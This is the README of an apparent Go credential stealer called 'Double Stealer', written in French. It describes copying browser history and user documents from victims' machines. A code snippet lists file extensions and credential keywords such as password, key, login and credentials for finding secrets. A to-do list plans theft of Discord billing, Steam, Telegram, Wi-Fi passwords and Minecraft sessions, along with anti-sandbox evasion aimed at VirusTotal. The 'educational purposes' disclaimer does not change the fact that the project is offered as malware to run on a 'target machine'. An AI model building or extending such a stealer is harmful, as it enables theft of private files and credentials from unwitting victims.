# Double Stealer

Double Stealer est un projet qui collecte des données de fichiers de navigateurs et d'emplacements de fichiers utilisateur sur différents systèmes d'exploitation. Il est conçu pour extraire et copier des fichiers sensibles en fonction des extensions et des noms spécifiés dans des répertoires prédéfinis.

❗❗❗Avertissement❗❗❗ : ce programme est proposé uniquement à des fins éducatives et de recherche. Le créateur de ce programme ne tolère ni ne soutient aucune activité illégale ou malveillante et ne sera pas tenu responsable des actions de ce type entreprises par d'autres personnes susceptibles d'utiliser ce programme. En téléchargeant ou en utilisant ce programme, vous reconnaissez que vous êtes seul responsable de toutes les conséquences pouvant résulter de l'utilisation de ce programme.

## Fonctionnalités

- **Vérification des Navigateurs Installés** : Identifie les navigateurs installés sur le système et crée des dossiers pour chacun d'eux.
- **Récupération des Fichiers d'Historique** : Extrait les fichiers d'historique des navigateurs les plus populaires.
- **Copie de Fichiers** : Copie les fichiers trouvés dans les répertoires spécifiés, tels que Desktop, Documents, et Téléchargements.
- **Création de Sous-Dossiers** : Organise les fichiers copiés dans des sous-dossiers appropriés.

## Installation

1. **Clonez le Dépôt**

   \`\`\`bash
   git clone https://github.com/username/repository-name.git
   cd Double_Stealer
   \`\`\`

2. **Installez les Dépendances**

   Assurez-vous d'avoir Go installé sur votre machine. Vous pouvez obtenir Go depuis [golang.org](https://golang.org/).

3. **Configurer les Listes d'Extensions et de Noms**

   Les listes d'extensions et de noms pour la recherche de fichiers se trouvent dans le fichier \`main.go\`. Vous pouvez adapter ces listes selon vos besoins :

   \`\`\`go
    var extensions := []string{
		".txt", ".pdf", ".odc", ".doc", ".docx", ".xls", ".xlsx", ".rtf", ".md", ".log", "sqlite3", "sqlite", ".db", ".json", ".xml"}

	var names := []string{
		"Password", "password", "Passwords", "passwords", "Pass", "pass", "MotsDePasse", "motsdepasse", "MDP", "mdp",
		"Key", "key", "Keys", "keys", "Cle", "cle", "Cles", "cles", "Code", "code", "Codes", "codes",
		"Credential", "credential", "Credentials", "credentials", "Login", "login", "Logins", "logins",
		"Access", "access", "Accès", "accès", "ID", "id", "Identifiant", "identifiant", "Identifiants", "identifiants",
		"Sécurité", "sécurité", "Security", "security", "note"}
   \`\`\`

4. **A rajouter**
   System Information
   
       User
       System
       Disk
       Network
       IP Information
   
   Discord Information
   
       Nitro
       Badges
       Billing
       Email
       Phone
       HQ Friends
   
   Application Data
   
       Steam
       Riot Games
       Telegram
       Saved Wifi Passwords
       Minecraft Session Files

Anti-debug

    Check if being run in a VirusTotal sandbox


## Utilisation

1. **Exécutez le Programme**

   Utilisez l'executable corepondant à la machine cible

   Vous pouvez également compiler le programme et exécuter l'exécutable généré (cf doc main.go).

## Compatibilité

Ce projet est conçu pour être polyvalent et peut s'adapter à différents systèmes d'exploitation, notamment Linux, macOS et Windows. Vous pouvez ajuster les chemins et configurations dans le fichier \`get-data.go\` pour correspondre à votre environnement spécifique.
